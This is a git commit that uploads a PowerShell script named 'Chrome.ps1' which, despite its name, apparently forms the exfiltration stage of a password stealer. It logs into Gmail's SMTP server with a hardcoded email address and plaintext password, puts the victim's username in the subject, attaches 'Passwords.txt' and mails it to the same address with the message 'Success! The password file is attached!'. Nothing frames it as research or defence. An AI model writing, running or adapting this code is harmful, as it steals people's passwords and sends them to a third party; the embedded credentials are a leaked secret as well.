c8d9692c89928f02d23415cbddb16ea4f6c314f6
vladislavian258147 <58993024+vladislavian258147@users.noreply.github.com>
2021-07-12 11:07:28 +0300

    Add files via upload

---
+++ Chrome.ps1
@@ -0,0 +1,26 @@
+$SMTPServer = 'smtp.gmail.com'
+
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+
+$SMTPInfo.EnableSsl = $true
+
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('vmoroz25578@gmail.com', '2444024fvlud')
+
+$E = New-Object System.Net.Mail.MailMessage
+
+$E.From = 'vmoroz25578@gmail.com'
+
+$E.To.Add('vmoroz25578@gmail.com')
+
+$E.Subject = $env:UserName
+
+$E.Body = 'Success! The password file is attached!'
+
+$F = "Passwords.txt"
+
+$E.Attachments.Add($F)
+
+$SMTPInfo.Send($E)
+
+exit
+
